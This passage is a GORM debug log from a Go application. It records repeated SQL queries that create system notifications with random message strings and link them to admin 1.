[0m[33m[0.452ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.435ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 158 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[6.797ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.694','2025-06-09 14:07:59.694',NULL,1,158) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.836ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.7','2025-06-09 14:07:59.7',NULL,'rNjmnyHYkbBRmrJMnrdr','system','2025-06-09 14:07:59.7',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.514ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.480ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 159 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[8.685ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.707','2025-06-09 14:07:59.707',NULL,1,159) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[10.705ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.715','2025-06-09 14:07:59.715',NULL,'NUMXklxHBZHkkRbrJUQo','system','2025-06-09 14:07:59.715',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.523ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.569ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 160 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[9.656ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.728','2025-06-09 14:07:59.728',NULL,1,160) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.798ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.736','2025-06-09 14:07:59.736',NULL,'InhVtmfdRqsMtjPmqWog','system','2025-06-09 14:07:59.736',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.441ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.407ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 161 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[6.679ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.742','2025-06-09 14:07:59.742',NULL,1,161) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[9.051ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.75','2025-06-09 14:07:59.75',NULL,'eZrfzcErdkFuRyQFTYiF','system','2025-06-09 14:07:59.75',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.446ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.473ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 162 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[6.946ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.759','2025-06-09 14:07:59.759',NULL,1,162) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.446ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.765','2025-06-09 14:07:59.765',NULL,'vGMjpxBpYcBfMUvWQwCZ','system','2025-06-09 14:07:59.764',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.480ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.456ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 163 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[6.968ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.773','2025-06-09 14:07:59.773',NULL,1,163) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[8.541ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.78','2025-06-09 14:07:59.78',NULL,'HKOJMzGwdTvfsVLyMtkf','system','2025-06-09 14:07:59.78',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.428ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.426ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 164 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[22.642ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.789','2025-06-09 14:07:59.789',NULL,1,164) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.649ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.811','2025-06-09 14:07:59.811',NULL,'tyRJVzZQazcumDirASpt','system','2025-06-09 14:07:59.81',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.483ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.496ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 165 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[9.532ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.82','2025-06-09 14:07:59.82',NULL,1,165) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[8.345ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.826','2025-06-09 14:07:59.826',NULL,'GUrnNndlMQhSUDFKwRkx','system','2025-06-09 14:07:59.826',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.460ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.556ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 166 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[9.644ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.836','2025-06-09 14:07:59.836',NULL,1,166) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.497ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.844','2025-06-09 14:07:59.844',NULL,'cKIiXcQXDdgWtONrGMni','system','2025-06-09 14:07:59.844',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.473ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.461ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 167 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[13.288ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.852','2025-06-09 14:07:59.852',NULL,1,167) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.760ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.864','2025-06-09 14:07:59.864',NULL,'lHPTMziWqHBZUXthmSQy','system','2025-06-09 14:07:59.864',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.434ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.482ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 168 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[8.666ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.871','2025-06-09 14:07:59.871',NULL,1,168) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.982ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.879','2025-06-09 14:07:59.879',NULL,'ZiMhBIREpLJXMExObezY','system','2025-06-09 14:07:59.879',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.497ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.543ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 169 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[7.183ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.886','2025-06-09 14:07:59.886',NULL,1,169) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[8.864ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.894','2025-06-09 14:07:59.894',NULL,'GrUhrLFTQmUafyDxnUKC','system','2025-06-09 14:07:59.894',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.517ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.596ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 170 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[9.376ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.903','2025-06-09 14:07:59.903',NULL,1,170) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.503ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.911','2025-06-09 14:07:59.911',NULL,'sCyvQdlgDzRmaFotosSA','system','2025-06-09 14:07:59.911',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.506ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.725ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 171 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[7.551ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.92','2025-06-09 14:07:59.92',NULL,1,171) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.932ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.926','2025-06-09 14:07:59.926',NULL,'AiPpuBIsTAIHuMKuLnwc','system','2025-06-09 14:07:59.926',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.893ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.647ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 172 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[13.750ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.943','2025-06-09 14:07:59.943',NULL,1,172) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.177ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.951','2025-06-09 14:07:59.951',NULL,'OMEfHEGFeGgPoqWYogqc','system','2025-06-09 14:07:59.951',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.478ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.599ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 173 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[7.474ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.958','2025-06-09 14:07:59.958',NULL,1,173) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[14.983ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.97','2025-06-09 14:07:59.97',NULL,'wPGCEGxvWFErzodVpJSD','system','2025-06-09 14:07:59.965',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.605ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.633ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 174 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[11.008ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.982','2025-06-09 14:07:59.982',NULL,1,174) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.676ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.991','2025-06-09 14:07:59.991',NULL,'fQsbNixSBSByTyWRtsPC','system','2025-06-09 14:07:59.991',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.430ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.517ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 175 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[8.661ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.999','2025-06-09 14:07:59.999',NULL,1,175) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.193ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.007','2025-06-09 14:08:00.007',NULL,'zxiUHLhFkTBRmULMdUKv','system','2025-06-09 14:08:00.007',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.503ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.453ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 176 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[6.963ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.014','2025-06-09 14:08:00.014',NULL,1,176) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.077ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.02','2025-06-09 14:08:00.02',NULL,'alLcHtKIWfOjwipPypZi','system','2025-06-09 14:08:00.02',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.880ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.475ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 177 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[9.063ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.028','2025-06-09 14:08:00.028',NULL,1,177) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
